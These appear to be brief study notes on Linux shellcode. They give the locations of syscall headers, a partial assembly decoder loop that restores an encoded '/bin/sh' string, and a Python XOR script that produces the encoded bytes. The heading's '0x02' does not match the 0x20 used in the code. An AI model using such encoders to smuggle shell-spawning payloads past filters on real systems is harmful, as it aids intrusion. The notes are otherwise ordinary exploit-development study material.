# Shellcodes notes

# Table of Content

- [Shellcodes notes](#shellcodes-notes)
- [Table of Content](#table-of-content)
- [Content](#content)
    - [Encoding shellcode](#encoding-shellcode)
        - [By Adding 0x02 to each char](#by-adding-0x02-to-each-char)

# Content

Where to get all available syscalls?:
- /usr/include/asm/unistd_32.h
- /usr/include/asm/unistd_64.h

Available socket's syscalls
- /usr/include/linux/net.h

## Encoding shellcode

### By Adding 0x02 to each char
```asm
...
popl %ebx           /* get address of /bin/sh */
movl %ebx,%ecx      /* copy the address to ecx */
addb $0x6,%cl       /* ecx now points to the last character */

loop:
cmpl %ebx,%ecx
jl skip             /* if (ecx<ebx) goto skip */
addb $0x20,(%ecx)   /* adds 0x20 to the byte pointed to by %ecx */
decb %cl            /* move the pointer down by one */
jmp loop
skip:
...
.string "\x0f\x42\x49\x4e\x0f\x53\x48"
```

Where the `.string` can be generated with this py script:
```python
def xor_encode(text, key):
    return ''.join(chr(ord(c) ^ key) for c in text)

def hex_encode(text):
    return ''.join(f'\\x{ord(c):02x}' for c in text)

key     = 0x20
decoded = "/bin/sh"
encoded = hex_encode(xor_encode(decoded, key))
print(encoded) # \x0f\x42\x49\x4e\x0f\x53\x48
```
